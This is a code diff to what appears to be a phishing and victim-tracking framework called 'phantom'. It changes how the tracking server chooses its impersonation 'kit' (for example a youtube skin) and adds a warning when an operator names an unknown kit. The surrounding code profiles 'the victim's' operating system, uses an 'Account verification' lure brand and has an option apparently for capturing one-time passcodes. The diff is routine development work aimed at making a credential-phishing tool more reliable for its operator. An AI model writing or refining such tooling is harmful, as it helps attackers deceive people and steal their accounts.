@@ -39,6 +39,9 @@ from dataclasses import dataclass, field
 from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
 from typing import Any, Callable, Dict, List, Optional, Tuple
 
+from phantom.automation.social import kits
+from phantom.utils.notifier import notifier
+
 
 def platform_from_ua(ua: str) -> str:
     """Resolve the victim's operating system from the browser User-Agent so
@@ -1375,8 +1378,16 @@ def env_tracker() -> TrackingServer:
     brand = str(cfg.get("tracker.brand", "Account verification",
                         env="PHANTOM_TRACK_BRAND"))
     otp = cfg.get_bool("tracker.otp", False, env="PHANTOM_TRACK_OTP")
-    skin = str(cfg.get("tracker.skin", "youtube", env="PHANTOM_TRACK_SKIN")) \
-        .strip().lower()
+    # KITS, not a free-form string: `youube` used to fall through to the
+    # youtube branch SILENTLY, so the operator believed they had picked a kit
+    # they had not. resolve_kit() reports which one actually renders.
+    requested_skin = str(cfg.get("tracker.skin", kits.DEFAULT_KIT,
+                                 env="PHANTOM_TRACK_SKIN")).strip().lower()
+    skin, skin_known = kits.resolve_kit(requested_skin)
+    if not skin_known:
+        notifier.warn(
+            f"tracker.skin '{requested_skin}' is not a known kit: using "
+            f"'{skin}'. Valid kits: {', '.join(kits.kit_ids())}")
     js_challenge = cfg.get_bool("tracker.js_challenge", False,
                                 env="PHANTOM_TRACK_JS_CHALLENGE")
     return TrackingServer(host=host, port=port, redirect_url=redirect,
